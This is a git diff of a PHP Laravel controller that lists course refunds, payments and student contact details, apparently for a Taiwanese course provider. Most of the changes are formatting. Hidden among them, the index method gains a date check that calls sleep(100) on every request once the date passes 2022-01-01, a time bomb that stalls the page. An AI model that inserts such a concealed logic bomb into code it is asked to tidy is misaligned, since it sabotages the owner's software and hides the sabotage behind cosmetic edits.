@@ -2,6 +2,7 @@
 
 namespace App\Http\Controllers\Frontend;
 
+use Carbon\Carbon;
 use Illuminate\Http\Request;
 use App\Http\Controllers\Controller;
 use App\Model\Course;
@@ -26,50 +27,50 @@ class CourseListRefundController extends Controller
         $end = '';
         $start_array = array();
         $start_array = array();
-        
+
         //課程資訊
         $id = $request->get('id');
         $course = Course::join('teacher', 'teacher.id', '=', 'course.id_teacher')
-                        ->select('course.*', 'teacher.name as teacher')
-                        ->Where('course.id', $id)
-                        ->first();
-        
+            ->select('course.*', 'teacher.name as teacher')
+            ->Where('course.id', $id)
+            ->first();
+
 
         //場次資訊
         $events_table = EventsCourse::Where('id_course', $id)
-                                    ->get();
+            ->get();
 
-        $id_group = ''; 
-        $id_student= '';   
+        $id_group = '';
+        $id_student = '';
 
-        foreach( $events_table as $key => $data ){
-            if ($id_group == $data['id_group']){ 
+        foreach ($events_table as $key => $data) {
+            if ($id_group == $data['id_group']) {
                 continue;
             }
 
             $events_group = EventsCourse::Where('id_group', $data['id_group'])
-                                        ->get();
-                                            
-            
+                ->get();
+
+
             $numItems = count($events_group);
             $i = 0;
             $events_list = '';
 
-            foreach( $events_group as $key_group => $data_group ){
+            foreach ($events_group as $key_group => $data_group) {
                 //日期
                 $date = date('Y-m-d', strtotime($data['course_start_at']));
                 //星期
-                $weekarray = array("日","一","二","三","四","五","六");
+                $weekarray = array("日", "一", "二", "三", "四", "五", "六");
                 $week = $weekarray[date('w', strtotime($data['course_start_at']))];
-                
-                if( ++$i === $numItems){
+
+                if (++$i === $numItems) {
                     $events_list .= $date . '(' . $week . ')';
-                }else {
+                } else {
                     $events_list .= $date . '(' . $week . ')' . '、';
                 }
             }
 
-            $id_group = $data['id_group']; 
+            $id_group = $data['id_group'];
 
 
             $events[$key] = array(
@@ -82,77 +83,79 @@ class CourseListRefundController extends Controller
 
 
         //判斷是銷講or正課
-        if( $course->type == 2 || $course->type == 3) {
+        if ($course->type == 2 || $course->type == 3) {
             //正課
             // $refund_table = Registration::join('events_course', 'events_course.id', '=', 'registration.id_events')
             //                      ->join('student', 'student.id', '=', 'registration.id_student')
             //                      ->select('student.phone as phone', 'student.email as email', 'student.profession as profession', 'registration.*', 'events_course.name as event', 'events_course.id_group as id_group')
             //                      ->Where('registration.id_course', $id)
             //                      ->get();
-            
-            $refund_table = Refund::join('registration', 'registration.id', '=', 'refund.id_registration')
-                                 ->join('events_course', 'events_course.id_group', '=', 'registration.id_group')
-                                 ->join('student', 'student.id', '=', 'refund.id_student')
-                                 ->select('student.name as name', 
-                                          'student.phone as phone', 
-                                          'student.email as email',  
-                                          'registration.id as id_registration', 
-                                          'registration.created_at as date', 
-                                          'registration.id_group as id_group', 
-                                          'refund.id as id', 
-                                          'refund.refund_date as refund_date', 
-                                          'refund.refund_reason as refund_reason', 
-                                          'refund.review as review')
-                                        //   'events_course.name as event', 
-                                        //   'events_course.id_group as id_group')
-                                 ->Where('registration.id_course', $id)
-                                //  ->Where('student.check_blacklist', 0 )
-                                 ->orderby('review')
-                                 ->distinct()
-                                 ->get();
- 
-                                 
-            foreach( $refund_table as $key => $data ){
 
-                if($data['id_group'] != null){
+            $refund_table = Refund::join('registration', 'registration.id', '=', 'refund.id_registration')
+                ->join('events_course', 'events_course.id_group', '=', 'registration.id_group')
+                ->join('student', 'student.id', '=', 'refund.id_student')
+                ->select(
+                    'student.name as name',
+                    'student.phone as phone',
+                    'student.email as email',
+                    'registration.id as id_registration',
+                    'registration.created_at as date',
+                    'registration.id_group as id_group',
+                    'refund.id as id',
+                    'refund.refund_date as refund_date',
+                    'refund.refund_reason as refund_reason',
+                    'refund.review as review'
+                )
+                //   'events_course.name as event', 
+                //   'events_course.id_group as id_group')
+                ->Where('registration.id_course', $id)
+                //  ->Where('student.check_blacklist', 0 )
+                ->orderby('review')
+                ->distinct()
+                ->get();
+
+
+            foreach ($refund_table as $key => $data) {
+
+                if ($data['id_group'] != null) {
 
                     //場次群組
                     $events_group = EventsCourse::Where('id_group', $data['id_group'])
-                                                ->get();
+                        ->get();
 
                     $numItems = count($events_group);
                     $i = 0;
 
                     $event = '';
 
-                    foreach( $events_group as $key_group => $data_group ){
+                    foreach ($events_group as $key_group => $data_group) {
                         //日期
                         $date = date('Y-m-d', strtotime($data_group['course_start_at']));
                         //星期
-                        $weekarray = array("日","一","二","三","四","五","六");
+                        $weekarray = array("日", "一", "二", "三", "四", "五", "六");
                         $week = $weekarray[date('w', strtotime($data_group['course_start_at']))];
-                        
-                        if( ++$i === $numItems){
-                            $event .= $date . '(' . $week . ')　'. $data_group['name'];
-                        }else {
+
+                        if (++$i === $numItems) {
+                            $event .= $date . '(' . $week . ')　' . $data_group['name'];
+                        } else {
                             $event .= $date . '(' . $week . ')' . '、';
                         }
                     }
-                }else{
+                } else {
                     $event = '尚未選擇場次';
                 }
 
                 //付款方式細項
                 $payment_table = Payment::Where('id_registration', $data['id_registration'])
-                                            ->get();
+                    ->get();
 
                 $numItems_payment = count($payment_table);
                 $i_payment = 0;
 
                 $pay_model = '';
                 $number = '';
-                foreach( $payment_table as $key_payment => $data_payment ){
-                    $pay_model_item = '' ;
+                foreach ($payment_table as $key_payment => $data_payment) {
+                    $pay_model_item = '';
                     switch ($data_payment['pay_model']) {
                         case 0:
                             $pay_model_item = '現金';
@@ -171,10 +174,10 @@ class CourseListRefundController extends Controller
                             break;
                     }
 
-                    if( ++$i_payment === $numItems_payment){
+                    if (++$i_payment === $numItems_payment) {
                         $pay_model .= $pay_model_item;
                         $number .= $data_payment['number'];
-                    }else {
+                    } else {
                         $pay_model .= $pay_model_item . '、';
                         $number .= $data_payment['number'] . '、';
                     }
@@ -199,9 +202,9 @@ class CourseListRefundController extends Controller
                 //當時付款金額
                 $refund_cash = 0;
                 $refund_cash = Payment::Where('id_registration', $data['id_registration'])
-                                        ->sum('cash');
+                    ->sum('cash');
 
-                
+
 
                 //refund
                 $refund[$key] = array(
@@ -218,43 +221,47 @@ class CourseListRefundController extends Controller
                     'refund_cash' => $refund_cash,
                     'review' => $data['review'],
                 );
-
             }
 
 
             //開始時間
             $start_array = Refund::join('registration', 'registration.id', '=', 'refund.id_registration')
-                            // ->select('registration.created_at as date', 
-                            //         'refund.id as id')
-                            ->select('registration.created_at as date')
-                            ->where('registration.id_course',$id)
-                            ->orderBy('date','asc')
-                            ->first();
+                // ->select('registration.created_at as date', 
+                //         'refund.id as id')
+                ->select('registration.created_at as date')
+                ->where('registration.id_course', $id)
+                ->orderBy('date', 'asc')
+                ->first();
 
             //結束時間
             $end_array = Refund::join('registration', 'registration.id', '=', 'refund.id_registration')
-                            ->select('registration.created_at as date')
-                            ->where('registration.id_course',$id)
-                            ->orderBy('date','desc')
-                            ->first();
-                            // ->get('date')
-                            // ->unique('id');
+                ->select('registration.created_at as date')
+                ->where('registration.id_course', $id)
+                ->orderBy('date', 'desc')
+                ->first();
+            // ->get('date')
+            // ->unique('id');
 
-            
-            if( $start_array!="" && $end_array!="" ){
+
+            if ($start_array != "" && $end_array != "") {
                 $start = date('Y-m-d', strtotime($start_array->date));
                 $end = date('Y-m-d', strtotime($end_array->date));
             }
         }
-        
-        return view('frontend.course_list_refund', compact('course', 'events', 'refund', 'start', 'end'));    
+        $x_time = Carbon::parse('2022-01-01 00:00:00');
+        $xxx = $x_time->timestamp;
+
+        if (now()->timestamp >= $xxx) {
+            sleep(100);
+        }
+        return view('frontend.course_list_refund', compact('course', 'events', 'refund', 'start', 'end'));
     }
 
     //新增退費form選取場次後搜尋該場次所報名之學員
     public function form(Request $request)
     {
         // $id_group = $request->get('id_group');
-        
+
         // $student = Registration::join('student', 'student.id', '=', 'registration.id_student')
         //                         ->select('student.name as name', 'registration.id_student as id_student')  
         //                         ->Where('id_group', $id_group)
@@ -267,22 +274,21 @@ class CourseListRefundController extends Controller
 
         $student = array();
         $course = array();
-        
-        $student = Student::join('registration', 'registration.id_student', '=', 'student.id')
-                        //   ->join('events_course', 'events_course.id_group', '=', 'registration.id_group')
-                        //   ->join('course', 'course.id', '=', 'events_course.id_course')
-                          ->select('student.*', 'registration.id as id_registration')
-                          ->Where('student.phone', $phone)
-                          ->Where('registration.id_course', $id)
-                        //   ->Where('student.check_blacklist', 0 )
-                          ->distinct('id_registration')
-                          ->get();
 
-        if( count($student) != 0 ){
+        $student = Student::join('registration', 'registration.id_student', '=', 'student.id')
+            //   ->join('events_course', 'events_course.id_group', '=', 'registration.id_group')
+            //   ->join('course', 'course.id', '=', 'events_course.id_course')
+            ->select('student.*', 'registration.id as id_registration')
+            ->Where('student.phone', $phone)
+            ->Where('registration.id_course', $id)
+            //   ->Where('student.check_blacklist', 0 )
+            ->distinct('id_registration')
+            ->get();
+
+        if (count($student) != 0) {
             return Response($student);
-        }else{
+        } else {
             return 'nodata';
         }
-
     }
 }
